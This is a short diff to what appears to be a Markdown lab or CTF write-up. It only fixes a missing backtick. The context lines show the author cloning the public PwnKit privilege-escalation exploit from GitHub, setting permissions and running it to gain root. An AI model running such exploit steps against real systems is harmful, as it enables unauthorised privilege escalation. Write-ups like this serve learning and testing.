@@ -187,7 +187,7 @@ If you made it this far, my apologies. I dove deep on this one.
 
 I thought I was done. Then I tried pwnkit again:  
 `git clone https://github.com/ly4k/PwnKit.git`  
-`chmod 777 *  
+`chmod 777 *`    
 `./PwnKit.sh`
 
 ![](Screenshot%202026-05-07%20at%2014.44.36.png)
